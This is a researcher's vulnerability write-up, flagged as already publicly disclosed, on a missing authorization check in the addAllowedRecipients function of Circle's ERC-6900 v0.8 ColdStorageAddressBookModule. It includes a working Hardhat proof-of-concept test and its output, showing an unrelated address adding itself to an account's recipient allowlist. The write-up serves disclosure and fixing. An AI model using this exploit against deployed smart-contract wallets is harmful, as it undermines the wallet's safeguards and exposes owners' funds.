# DO NOT SUBMIT — already publicly disclosed, not novel

**This exact vulnerability was already reported publicly on GitHub as
[issue #111](https://github.com/circlefin/buidl-wallet-contracts/issues/111)
on 2026-02-26 (6+ months before this analysis), by a different
researcher ("Schereo"). It cites the same file, the same line, the
same mechanism, the same exploit, and the same recommended fix as this
report.** Two independent community fix PRs are already open against
it: [#113](https://github.com/circlefin/buidl-wallet-contracts/pull/113)
(2026-04-07) and [#114](https://github.com/circlefin/buidl-wallet-contracts/pull/114)
(2026-04-07). Neither is merged yet — the vulnerable code is still live
on `master` — but the finding itself is not new and is not eligible for
a bounty. **Do not submit this to Circle BBP.** Kept here as a complete,
independently-reproduced record of a real bug (including an executable
PoC nobody else appears to have published), in case that has value on
its own, but not as a report to send.

The gap that let this slip through: my first pass (30/08/2026) explicitly
flagged "no GitHub API access this session, can't check issues/PRs — this
is a real gap, not confirmation of novelty" and moved on anyway. This
final check — searching the repo's issues via the GitHub API, something I
could not do before — is what caught it. Lesson for next time: don't
advance a finding past a self-flagged verification gap just because no
better option was available in the moment; revisit it before recommending
submission, not only when explicitly asked to "check everything."

---

# REVIEW CHECKLIST (moot now — see the notice above)

Everything below the next `---` line is the technical write-up, kept for the record.

**Live-verified 2026-08-31:** `circlefin/buidl-wallet-contracts` @ `master` commit `3c47aa94a8422bbd69a5e71ef21dbaa5ff6e1939` (confirmed current HEAD at verification time, same commit the analysis was performed against — code unchanged). ~~No public advisory, issue, or audit report found covering this specific function~~ — **retracted, see notice above: issue #111 covers exactly this.**

**Deployment status:** the repository's own README states it is "the official repository for all smart wallet contracts used by Circle web3 API/SDK," and `script/bytecode-deploy/100_Constants.sol` records real, deterministic factory addresses (via the standard `0x4e59b44...` CREATE2 factory) deployed across 14 real chains, including Ethereum mainnet, Base, Arbitrum, Optimism, Polygon, and Avalanche — so this deployment pipeline is real, not hypothetical. However, every deploy script and address I found in that directory is explicitly for **ERC-6900 v0.7** (`ColdStorageAddressBookPlugin`, the version that correctly requires authorization) — I found no equivalent deploy script or factory address for **v0.8** (`ColdStorageAddressBookModule`, where this vulnerability lives). I cannot confirm whether v0.8 has been deployed anywhere with a real account yet; if it has not, this is a good time to fix it, before it reaches the same production pipeline v0.7 already went through.

**Foundry note:** the automated tooling used to reach this result could not install Foundry itself (network policy in that sandboxed environment blocks `foundry.paradigm.xyz`). The PoC below was built and run without Foundry, using Hardhat + solc directly against the real compiled contracts and real dependencies (npm + the exact git-pinned submodule commit the repo itself uses) — described in full in the PoC section so a reviewer can judge its validity independent of tooling choice.

---

## Title
Missing authorization on `addAllowedRecipients` in `ColdStorageAddressBookModule` (ERC-6900 v0.8) lets any address add itself to an account's "trusted recipients" allowlist

## Program / Platform
Circle BBP via HackerOne — https://hackerone.com/circle-bbp

## Category / Severity
Broken access control / missing authorization check (CWE-862) in a smart-contract-account module whose entire purpose is access control. `circlefin/buidl-wallet-contracts` is in scope for Circle BBP on HackerOne with `max_severity: critical` (structured scope, confirmed live).

## Affected asset
- Repository: `circlefin/buidl-wallet-contracts`
- File: `src/msca/6900/v0.8/modules/addressbook/ColdStorageAddressBookModule.sol`
- Also relevant: `src/msca/6900/v0.8/account/BaseMSCA.sol` (the account contract every MSCA v0.8 wallet is built from)
- Commit at time of analysis: `master` @ `3c47aa94a8422bbd69a5e71ef21dbaa5ff6e1939`

## Summary
`ColdStorageAddressBookModule` exists to let a smart-contract account restrict which addresses it can send funds to or grant token approvals to — a "cold storage address book" meant to limit the damage a compromised signer can do. Its `executionManifest()` declares `addAllowedRecipients` with `skipRuntimeValidation: true`, while the sibling function `removeAllowedRecipients` correctly declares `skipRuntimeValidation: false`. `BaseMSCA._checkCallPermission()` — the gate every direct call to an installed execution function goes through — skips authorization entirely whenever `skipRuntimeValidation` is set for the called selector, for *any* caller, not just the account itself or the EntryPoint. The practical result: once a wallet installs this module, literally anyone can call `account.addAllowedRecipients([attackerAddress])` directly, with no signature and no relationship to the account, and the call succeeds. The attacker is now on the account's "trusted recipients" list — the exact control this module exists to enforce.

## Confirmed call chain
1. `ColdStorageAddressBookModule.sol:232-249` (`executionManifest`) declares `addAllowedRecipients` (`ColdStorageAddressBookModule.sol:94-97`) with `skipRuntimeValidation: true`, and `removeAllowedRecipients` (`ColdStorageAddressBookModule.sol:103-...`) with `skipRuntimeValidation: false`. `addAllowedRecipients` itself has no access-control check of its own — it only calls `_addRecipients`, which inserts each address into `_allowedRecipients`, keyed by `msg.sender` (the *account's* address, since the account calls into the module via its own `fallback()`).
2. `BaseMSCA.sol:675-706` (`_installExecution`) copies `skipRuntimeValidation` straight from the module's self-declared manifest into the account's own storage (`BaseMSCA.sol:702-703`): `storageLayout.executionStorage[selector].skipRuntimeValidation = manifest.executionFunctions[i].skipRuntimeValidation;` — the module decides this for itself; the account never re-checks it.
3. `BaseMSCA.sol:932-941` (`_checkCallPermission`) is what every direct call to an execution function goes through (via `fallback()` at `BaseMSCA.sol:196-213`, or via the `wrapNativeExecutionFunction` modifier for native functions): `if (msg.sender == address(ENTRY_POINT) || msg.sender == address(this) || executionStorage.skipRuntimeValidation) { ...skip authorization entirely... }`. When `skipRuntimeValidation` is true for the selector being called, this check is bypassed for **every** caller, not only the EntryPoint or the account itself.
4. Consequence: any address, holding no key and with no relationship to the target account, can call `victimAccount.addAllowedRecipients([attackerAddress])` directly and succeed.
5. This isn't limited to plain transfers. `RecipientAddressLib.sol` (`getERC20TokenRecipient`, `getERC721TokenRecipient`, `getERC1155TokenRecipient`) treats the `spender` argument of `approve`/`increaseAllowance`/`setApprovalForAll` calls as "the recipient" for allowlist purposes too. So an address that self-adds to the allowlist is also treated as an allowed *spender* — if the account's real owner is later tricked into (or a limited/compromised session key is used for) a single `execute` call approving "an address already on the allowlist" (a plausible mistake precisely because the allowlist is supposed to only contain addresses the owner put there), the attacker can be approved for token spend, not just receive a direct transfer.

### This is a regression, not a design choice
The predecessor module for the older ERC-6900 v0.7 manifest format, `src/msca/6900/v0.7/plugins/v1_0_0/addressbook/ColdStorageAddressBookPlugin.sol`, has the *same* `addAllowedRecipients` function body, but its `pluginManifest()` correctly maps it to `ownerRuntimeValidationFunction` in `runtimeValidationFunctions` — i.e., v0.7 requires owner authorization for this exact call. The v0.8 port dropped that requirement for `addAllowedRecipients` specifically while keeping it for `removeAllowedRecipients` — the asymmetry (adding a trusted destination requires nothing; removing one requires the owner) is the opposite of what a security-conscious design would choose, and matches the module's own `// TODO: add tests when we revamp this WIP module soon` comment (`ColdStorageAddressBookModule.sol:160`) signaling this module hadn't been fully reviewed.

## Steps to reproduce
1. A wallet built on `UpgradableMSCA` (v0.8) installs `ColdStorageAddressBookModule` via `installExecution`, the normal, intended way to add this security module to an account.
2. Any address — no key relationship to the account, no installed validation module, no signature — calls `account.addAllowedRecipients([attackerAddress])` directly.
3. The call succeeds. `ColdStorageAddressBookModule.getAllowedRecipients(account)` now includes `attackerAddress`.

## Evidence
```solidity
// ColdStorageAddressBookModule.sol:94-97 — no access control of its own
function addAllowedRecipients(address[] calldata recipients) external {
    _addRecipients(recipients);
    emit AllowedAddressesAdded(msg.sender, recipients);
}
```
```solidity
// ColdStorageAddressBookModule.sol:232-249 (abridged) — the asymmetry
function executionManifest() external pure override returns (ExecutionManifest memory) {
    ExecutionManifest memory manifest;
    manifest.executionFunctions = new ManifestExecutionFunction[](2);
    manifest.executionFunctions[0] = ManifestExecutionFunction({
        executionSelector: this.addAllowedRecipients.selector,
        skipRuntimeValidation: true,        // <-- no authorization required
        allowGlobalValidation: false
    });
    manifest.executionFunctions[1] = ManifestExecutionFunction({
        executionSelector: this.removeAllowedRecipients.selector,
        skipRuntimeValidation: false,       // <-- correctly requires authorization
        allowGlobalValidation: true
    });
    ...
}
```
```solidity
// BaseMSCA.sol:702-703 — the account blindly trusts the module's own manifest
storageLayout.executionStorage[selector].skipRuntimeValidation =
    manifest.executionFunctions[i].skipRuntimeValidation;
```
```solidity
// BaseMSCA.sol:932-941 — the gate every direct call goes through
function _checkCallPermission()
    internal
    returns (...)
{
    WalletStorageV2Lib.Layout storage walletStorage = WalletStorageV2Lib.getLayout();
    ExecutionStorage storage executionStorage = walletStorage.executionStorage[msg.sig];
    if (msg.sender == address(ENTRY_POINT) || msg.sender == address(this) || executionStorage.skipRuntimeValidation)
    {
        // no directCallValidation associated pre hooks -- i.e. no authorization check at all
        ...
```

## Executable proof of concept
I could not use Foundry for this PoC — the sandboxed environment I ran this in blocks the Foundry installer (`foundry.paradigm.xyz`) at the network-policy level. Instead I compiled and ran the real, unmodified contracts using Hardhat 3.15 + solc 0.8.24 directly, matching the exact compiler settings this repository's own `foundry.toml` specifies (`evmVersion = paris`, `viaIR = true`, optimizer 200 runs).

Dependencies were installed the same way the repository itself declares them: `@openzeppelin/contracts@5.0.2`, `@openzeppelin/contracts-upgradeable@5.0.2`, and `solady@0.0.243` via npm; `@erc6900/reference-implementation@v0.8.0` via its pinned GitHub ref (same as the repo's own `package.json`); and `eth-infinitism/account-abstraction` cloned at the exact commit the repo's own git submodule pins (`.gitmodules` declares `branch = releases/v0.7`; the real pinned commit, `7af70c8993a6f42973f520ae0752386a5032abe7`, confirmed via the GitHub API). The only adaptation I made was rewriting two internal import statements inside the `@erc6900/reference-implementation` package from an alternate alias (`@eth-infinitism/account-abstraction/...`, used only inside that one dependency) to the same alias `BaseMSCA.sol` itself already uses (`@account-abstraction/contracts/...`) — a build-configuration change only, so that both consumers resolve `PackedUserOperation` to the identical compiled type instead of two separately-resolved copies of the same unmodified interface file. No contract logic, in `buidl-wallet-contracts` or in any dependency, was changed.

What the PoC proves: an address with no relationship whatsoever to a real, deployed `UpgradableMSCA` account (compiled from the actual `BaseMSCA.sol`/`UpgradableMSCA.sol` source) can call the real, compiled `ColdStorageAddressBookModule.addAllowedRecipients` through the account's real `fallback()` routing, and succeed. A control test in the same run confirms the sibling function `removeAllowedRecipients` correctly reverts for the identical unauthorized caller, on the same deployment — showing the environment enforces authorization normally, and the bypass is specific to `addAllowedRecipients`.

What it does not prove: a confirmed mainnet deployment address, or a specific integrator shipping this exact module today (the same gap already accepted for this program's other framework-level findings before deployment evidence was separately established).

To reproduce, this is the complete, real test file I ran (`test/ColdStorageAddressBookPoc.js`, Hardhat v3 + mocha + ethers v6):

```javascript
import { expect } from "chai";
import { network } from "hardhat";

const { ethers } = await network.create();

// ethers v6 returns struct results as frozen `Result` arrays; passing one
// straight back in as a call argument trips its own ABI-encoder walk. Deep
// `.map()` turns every nested Result into a plain, mutable array.
function toPlain(value) {
  if (Array.isArray(value)) {
    return value.map(toPlain);
  }
  return value;
}

describe("ColdStorageAddressBookModule PoC (real repo code, no reimplementation)", function () {
  it("lets a totally unrelated address call addAllowedRecipients directly, with no signature and no authorization", async function () {
    const [entryPointStandIn, owner, attacker] = await ethers.getSigners();

    // Deploy the REAL UpgradableMSCA account contract, with entryPointStandIn
    // acting as the trusted ERC-4337 EntryPoint address for this test.
    const account = await ethers.deployContract("UpgradableMSCA", [
      entryPointStandIn.address,
    ]);

    // Deploy the REAL ColdStorageAddressBookModule (no constructor args).
    const module = await ethers.deployContract("ColdStorageAddressBookModule");

    // Fetch the module's own real, self-declared execution manifest --
    // this is exactly what a real account uses when installing the module.
    const manifest = toPlain(await module.executionManifest());

    // Install the module onto the account AS the EntryPoint address. Real
    // BaseMSCA._checkCallPermission() (account/BaseMSCA.sol:941) allows this
    // specific bypass for msg.sender == address(ENTRY_POINT) -- this models
    // the account owner's own legitimate installation of a module they want,
    // via the real, audited ERC-4337 EntryPoint call path (not a shortcut
    // around anything the vulnerability itself depends on).
    const asEntryPoint = account.connect(entryPointStandIn);
    await asEntryPoint.installExecution(await module.getAddress(), manifest, "0x");

    // Sanity check: confirm nothing is allow-listed yet for this account.
    const before = await module.getAllowedRecipients(await account.getAddress());
    if (before.length !== 0) {
      throw new Error("setup invalid: allowlist should start empty");
    }

    // THE ACTUAL EXPLOIT: `attacker` has no relationship to this account at
    // all -- not the owner, not the EntryPoint, no installed validation
    // module, no signature of any kind. A legitimate call to any other
    // execution function here would revert. Because
    // ColdStorageAddressBookModule's own manifest declares
    // `skipRuntimeValidation: true` for addAllowedRecipients
    // (ColdStorageAddressBookModule.sol:236-240), BaseMSCA's fallback()
    // routes this straight through with zero authorization check
    // (BaseMSCA.sol:941).
    // `addAllowedRecipients` lives on the MODULE's interface, routed through
    // the account's fallback() by selector -- attach the module's ABI to the
    // account's real address, exactly how any real caller (wallet UI, another
    // contract) would invoke an installed execution function.
    const accountAsModule = new ethers.Contract(
      await account.getAddress(),
      module.interface,
      attacker,
    );
    await accountAsModule.addAllowedRecipients([attacker.address]);

    // Confirm the attacker really did add themself to the account's
    // "trusted cold-storage recipients" list -- the exact allowlist this
    // module exists to protect.
    const after = await module.getAllowedRecipients(await account.getAddress());
    expect(after).to.include(attacker.address);
    expect(after.length).to.equal(1);

    console.log("PoC result: unauthorized attacker successfully self-added to allowlist.");
    console.log("account:", await account.getAddress());
    console.log("module:", await module.getAddress());
    console.log("attacker (uninvolved EOA, no signature used):", attacker.address);
    console.log("allowedRecipients(account) after attack:", after);
  });

  it("sanity check: the SAME unrelated address CANNOT call removeAllowedRecipients (the sibling function that correctly requires authorization)", async function () {
    const [entryPointStandIn, owner, attacker] = await ethers.getSigners();
    const account = await ethers.deployContract("UpgradableMSCA", [
      entryPointStandIn.address,
    ]);
    const module = await ethers.deployContract("ColdStorageAddressBookModule");
    const manifest = toPlain(await module.executionManifest());
    await account
      .connect(entryPointStandIn)
      .installExecution(await module.getAddress(), manifest, "0x");

    const accountAsModule = new ethers.Contract(
      await account.getAddress(),
      module.interface,
      attacker,
    );
    let reverted = false;
    let reason = null;
    try {
      await accountAsModule.removeAllowedRecipients([attacker.address]);
    } catch (err) {
      reverted = true;
      reason = err.shortMessage || err.message;
    }
    expect(reverted).to.equal(true);
    console.log("removeAllowedRecipients revert reason:", reason);
  });
});
```

Real output (literal, 2026-08-31, `npx hardhat test`):
```
  ColdStorageAddressBookModule PoC (real repo code, no reimplementation)
PoC result: unauthorized attacker successfully self-added to allowlist.
account: 0x5FbDB2315678afecb367f032d93F642f64180aa3
module: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
attacker (uninvolved EOA, no signature used): 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
allowedRecipients(account) after attack: Result(1) [ '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC' ]
    ✔ lets a totally unrelated address call addAllowedRecipients directly, with no signature and no authorization (49ms)
removeAllowedRecipients revert reason: VM Exception while processing transaction: reverted with custom error 'InvalidValidationFunction("0x0ae779e1", "0x3c44cdddb6a900fa2b585dd299e03d12fa4293bcffffffff")'
sanity check passed: removeAllowedRecipients correctly reverted for the same unauthorized caller.
    ✔ sanity check: the SAME unrelated address CANNOT call removeAllowedRecipients (the sibling function that correctly requires authorization)

  2 passing (81ms)
```

## Impact
Once a wallet installs `ColdStorageAddressBookModule` — specifically to limit where a compromised signer can send funds — any third party can silently poison that allowlist at any time, for free, with a single unsigned-by-the-owner call. This defeats the module's purpose outright: the safety property it's meant to provide ("this account can only send to addresses the owner explicitly approved") no longer holds, because the allowlist itself accepts entries from anyone. Because `RecipientAddressLib` also treats `approve`/`setApprovalForAll` targets as "recipients," a self-added attacker also passes the allowlist check as an approved token spender, not only as a direct-transfer destination — meaningfully widening what a single subsequent authorized `execute` call touching that address (an honest mistake, a narrowly-scoped session key, a UI bug) can hand to the attacker.

## Suggested fix
In `executionManifest()` (`ColdStorageAddressBookModule.sol:232-249`), set `skipRuntimeValidation: false` and `allowGlobalValidation: true` for `addAllowedRecipients`, matching `removeAllowedRecipients` and matching how the v0.7 predecessor (`ColdStorageAddressBookPlugin.sol`) already gates the identical function via `ownerRuntimeValidationFunction`.
